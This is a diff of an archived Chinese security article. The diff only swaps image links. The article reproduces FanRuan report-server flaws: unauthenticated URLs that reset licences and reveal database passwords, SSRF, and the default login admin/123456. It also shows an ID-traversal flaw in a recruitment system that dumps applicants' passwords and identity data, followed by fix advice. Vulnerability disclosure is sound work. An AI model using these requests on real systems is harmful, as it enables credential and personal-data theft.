@@ -49,7 +49,7 @@ schema_version: "1"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/nltw2N8_MB87UosnGDv6kA)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
 前言  
 
@@ -72,7 +72,7 @@ schema_version: "1"
 
 ”
 
-![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
 ****Part 1 漏洞背景****
 
@@ -86,11 +86,11 @@ schema_version: "1"
 
 **帆软报表系统是一款纯 Java 编写的、集数据展示 (报表) 和数据录入 (表单) 功能于一身的企业级 web 报表工具。**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCia9ATjLySiaBSb89uAUJuntHL2jnMlOH4aPiaqN6Ro7Oiaxe1tM0ic4asHg/640?wx_fmt=png)
+![](../../.resource/remote/35b1b9109584d576ab00eddb06dc7a6b1aff95baf2b16b2b46270adab5d5e9e4.png)
 
 ”
 
-![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
 ****Part 2 漏洞描述****
 
@@ -105,7 +105,7 @@ schema_version: "1"
 
 ”
 
-![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
 ****Part 3 漏洞影响范围****
 
@@ -120,11 +120,11 @@ schema_version: "1"
 **此版本现已不再维护  
 **
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBC6NEzIlYVIcyicOuictFB4j35kRicYnW3AEaSN69mfWHibBeT3PQiaKNqn5w/640?wx_fmt=png)
+![](../../.resource/remote/8415bf51eedd5b67d2213d2ab0aa19c19ec0c3cdb86f9246b76e23e1861e2dca.png)
 
 ”  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
 ****Part 4 FoFa 语法****
 
@@ -138,7 +138,7 @@ schema_version: "1"
 
 ”  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
 ****Part 5 漏洞复现****
 
@@ -157,7 +157,7 @@ schema_version: "1"
 http://XXXXXX/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCWFyBvmURTxVicB8icXqf64TV15HL8YdM3WwKia4pxRXBNAA9ic64Gz1H6Q/640?wx_fmt=png)
+![](../../.resource/remote/37f28084ac59d6d1d86059ece56994607bc17ec6676311d3833f38af522aef8a.png)
 
 **2. 未授权重置授权**  
 
@@ -165,7 +165,7 @@ http://XXXXXX/ReportServer?op=fr_server&cmd=sc_visitstatehtml&showtoolbar=false
 http://XXXXXX/ReportServer?op=fr_server&cmd=sc_version_info&showtoolbar=false
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBC7jPmhA7wd8HCYFrsosvrpiaC4AFwxT4sAnG5NChURNOwJcFbESszzPQ/640?wx_fmt=png)
+![](../../.resource/remote/4fe96e4fd8c63f514b86cd85c541b27274d661e25980ba5d217a9116b53fa6c3.png)
 
 **3. 查看数据库密码**  
 
@@ -173,7 +173,7 @@ http://XXXXXX/ReportServer?op=fr_server&cmd=sc_version_info&showtoolbar=false
 http://XXXXXX/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCia7DvZPbjA8o1RtQqzLVhB0VCwq0ply6IRAftHliabZjQe4N7UR5Qhag/640?wx_fmt=png)
+![](../../.resource/remote/69ca10f082cc55b26c1e9b96a79e00ce022be788c9d3a445137679ed6899afc9.png)
 
 **4.SSRF**
 
@@ -181,7 +181,7 @@ http://XXXXXX/ReportServer?op=fr_server&cmd=sc_getconnectioninfo
 http://XXXXXX/ReportServer?op=resource&resource=dnslog地址
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCibVFsz3SVAUgIYGEHSKErTUlIxp8g5LzE8TASuzsLvibK2VibFsvzRU0Q/640?wx_fmt=png)
+![](../../.resource/remote/c22d42597869ac6cc7cbbfaeb215003e8c0b588a470588360ec77b3beafba720.png)
 
 **5. 默认弱口令  
 **
@@ -193,7 +193,7 @@ http://XXXXXX/ReportServer?op=resource&resource=dnslog地址
 admin / 123456
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCUbCvgDC0r1CuQLNkkCMBDAgosYVa3oJhNrBy57pQibhFc8JNknURYAg/640?wx_fmt=png)
+![](../../.resource/remote/096fb5122226ab1bfb9cfee69e61be0bbbb03f897bd1e84f35d41d8e40197b99.png)
 
 **在挖掘这个报表系统漏洞的过程中，发现这个报表系统是搭载在一个招聘系统的后面的  
 **
@@ -203,7 +203,7 @@ admin / 123456
 
 **有可能也不是这样的，欢迎师傅指正！**  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCfIB4FUQY5S9Drdc5F5KxVaEbZAWRb1aDwQo2sx39HxR5w6lzX1vyvQ/640?wx_fmt=png)
+![](../../.resource/remote/cc70e42770ed434ca814f47618b749831d261e8068d60a435a1ff8c8dc92e584.png)
 
 **既然帆软报表系统的洞都发了，这个招聘系统的洞也顺便发出来吧！  
 **
@@ -220,16 +220,16 @@ admin / 123456
 https://XXXXXX/project/shyyxy/default/recruitLogin.jsp?FM_SYS_ID=XXXXXX&FM_SYS_CODE=SYSTEM_RECRUIT#
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCniatnPibk8ljxJRIGffxBlfAHbgAqvbsrHStGRAYqthbZ1o2IddHjMNQ/640?wx_fmt=png)
+![](../../.resource/remote/9cb3a1a6036edc391a39f3e01928668b253ed4e9fd1c4eaebd61f0cccbebf963.png)
 
 **测试账户 XXXXXX XXXXXX  
 **
 
 **登录进去后，点击我的申请再抓包，有个** **id** **参数可以遍历。**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBC0ZIEmvYuiajaPfliccLgoRMib9vPu5ajN744RPD1e5Q9tuiaRFn4CuWy0A/640?wx_fmt=png)
+![](../../.resource/remote/1f1831945e17ca94bed23e36b5b83bd7870c9f8ca591db8bf909968d37b5b7d1.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCLuItnR1kmSKfYTsDm65BNhduY7YRWXDX5zRmmYXXwuxhCcNqZz8PdQ/640?wx_fmt=png)
+![](../../.resource/remote/48936e486056a4c5f5956f764dd511ba8092f5f7a9863571af99899a2bfe3c59.png)
 
 **可以看到很多 id 存在，就不一一测试了  
 **
@@ -237,12 +237,12 @@ https://XXXXXX/project/shyyxy/default/recruitLogin.jsp?FM_SYS_ID=XXXXXX&FM_SYS_C
 **改成 2138 后（****2138 是一个特殊的 id 值****），点新增  
 **
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBC0ZIEmvYuiajaPfliccLgoRMib9vPu5ajN744RPD1e5Q9tuiaRFn4CuWy0A/640?wx_fmt=png)
+![](../../.resource/remote/1f1831945e17ca94bed23e36b5b83bd7870c9f8ca591db8bf909968d37b5b7d1.png)
 
 **然后点击申请人框框处，发现输出了所有账户和密码（身份证电话等敏感信息）  
 **
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBCGhCAB3JWtHpARwybR45T4YUib1BRy55x5nu8ia9n1DyiaF0TicEXYVUJBQ/640?wx_fmt=png)
+![](../../.resource/remote/42035985db16a4a5cc5583ea1456f47c6ace1661bfa6d9d2b4ae4057168b1a05.png)
 
 **图中 4Q 开头的密码为 123456  
 **
@@ -261,13 +261,13 @@ https://XXXXXX/project/shyyxy/default/recruitLogin.jsp?FM_SYS_ID=XXXXXX&FM_SYS_C
 https://XXXXXX/base/hr/a.do?action=list&entityId=HR_RECRUIT_USER&FM_SYS_ID=XXXXXX&_dc=1615462290692&columnFieldNames=ID,ACCOUNT,NAME,PASSWORD,EMAIL,REGISTER_DATE,PHONE,TYPE#,ID_CODE,IS_LOGIN#&search.NAME#like=&searchMode=simple&page=1&start=0&limit=500
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/EWF7rQrfibGYicfDqs81xf6p95jt0twSBChZMH9dPmriaIIYicWLfE8YIxZK94IicmacMS2W9icGW7BGQHVPhDPgwARg/640?wx_fmt=png)
+![](../../.resource/remote/01d35120c7adeac9065c16068112eebcbb76e20a1d4ba9dbdef9ac70e3e4aff8.png)
 
 **涉及信息过多，打厚码**  
 
 ”
 
-![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
 ****Part 6 修复建议****
 
@@ -286,7 +286,7 @@ https://www.fanruan.com/support
 
 ”
 
-![](https://mmbiz.qpic.cn/mmbiz_png/OBLmObCsZtRhFM3KeDj0QMtHtS04jFyCfsXLsRytlX5oAxgTNL5dYAAe5swJaOREVqksBqdUW8nzibErssPRu5w/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
 ****Part 7 关于抽奖****
 
@@ -308,19 +308,19 @@ https://www.fanruan.com/support
 **如果对你有帮助的话  
 那就长按二维码，关注我们吧！**  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/Qx4WrVJtMVKBxb9neP6JKNK0OicjoME4RvV4HnTL7ky0RhCNB0jrJ66pBDHlSpSBIeBOqCrOTaWZ2GNWv466WNg/640?wx_fmt=png)
+![](../../.resource/remote/c054b4eafe6ae7a450ae6350e8669e79fa9f85a67722cd074fa3962c800a2ab9.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/EWF7rQrfibGYIzeAryXG89shFicuMUhR5eYdoSEffib7WmrGvGmSPpdvYfpGIA7YGKFMoF1IrXutHXuD8tBBbAYJg/640?wx_fmt=jpeg)
+![](../../.resource/remote/5ddf78d6ebe65766a69e829e9eb3baddd946677f3cfc0008edbc430328dcfc1a.jpg)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/wKOZZiacmHTc9LIKRXddrzz6MosLdiaH4EQNQgzsrSXHObdAia8yeIlLz6MbK9FxNDr44G7FNb2DBufqkjpwiczAibA/640?wx_fmt=png)
+![](../../.resource/remote/5c19b8b53f1a113b7b596c610a3ae6943b3ed60c4a2987f6f00fe00090e2fe1e.png)
 
-**![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)**  [实战 | 我的 SRC 挖掘 - 如何一个洞拿下百分 QAQ](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485758&idx=1&sn=cafc83acbfd9de667bdceb85c04b9d77&chksm=c07fb2caf7083bdc18f1beae464118405003a18aa47aa6edbf51929a7da1ff47042a8b2190ae&scene=21#wechat_redirect)
+**![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)**  [实战 | 我的 SRC 挖掘 - 如何一个洞拿下百分 QAQ](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485758&idx=1&sn=cafc83acbfd9de667bdceb85c04b9d77&chksm=c07fb2caf7083bdc18f1beae464118405003a18aa47aa6edbf51929a7da1ff47042a8b2190ae&scene=21#wechat_redirect)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [记一次相对完整的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485464&idx=2&sn=23ac41201aa38ba22881c06632d60ce0&chksm=c07fb3ecf7083afa9b32725c4b288b11e376550f1d88b96243c649f5fe91ba9ea13be7b10d75&scene=21#wechat_redirect)  
+![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)  [记一次相对完整的渗透测试](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485464&idx=2&sn=23ac41201aa38ba22881c06632d60ce0&chksm=c07fb3ecf7083afa9b32725c4b288b11e376550f1d88b96243c649f5fe91ba9ea13be7b10d75&scene=21#wechat_redirect)  
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif) [实战 | SQL 注入 - BOOL 盲注 - 一个小细节](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485586&idx=1&sn=148764c1aab126a76b0c459ec67dc1f8&chksm=c07fb366f7083a70301714c87c8d09d3ee2c0dd2567360a46e87372c62a0f0415074ca06631a&scene=21#wechat_redirect)
+![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif) [实战 | SQL 注入 - BOOL 盲注 - 一个小细节](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485586&idx=1&sn=148764c1aab126a76b0c459ec67dc1f8&chksm=c07fb366f7083a70301714c87c8d09d3ee2c0dd2567360a46e87372c62a0f0415074ca06631a&scene=21#wechat_redirect)
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/b96CibCt70iaaJcib7FH02wTKvoHALAMw4fK0c7kH8Aa77gpMcYib3IVwvicSKgwrRupZFeUBUExiaYwOvagt09602icg/640?wx_fmt=gif)  [实战 | 一次简单的信息收集到 getshell 的过程](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485252&idx=1&sn=88464e7c793a168d7f1c2506414c1695&chksm=c07fbcb0f70835a6a768376c3ee586e384b4e314d59aedaed0c04a2d6c9237e7314205e0f9dc&scene=21#wechat_redirect)
+![](../../.resource/remote/fa8192fb4a90b787868684f95ad885090b3f353081f4bcc152e66c612c6a4c74.gif)  [实战 | 一次简单的信息收集到 getshell 的过程](http://mp.weixin.qq.com/s?__biz=Mzg5NjU3NzE3OQ==&mid=2247485252&idx=1&sn=88464e7c793a168d7f1c2506414c1695&chksm=c07fbcb0f70835a6a768376c3ee586e384b4e314d59aedaed0c04a2d6c9237e7314205e0f9dc&scene=21#wechat_redirect)
 
 右下角求赞求好看，喵~
 
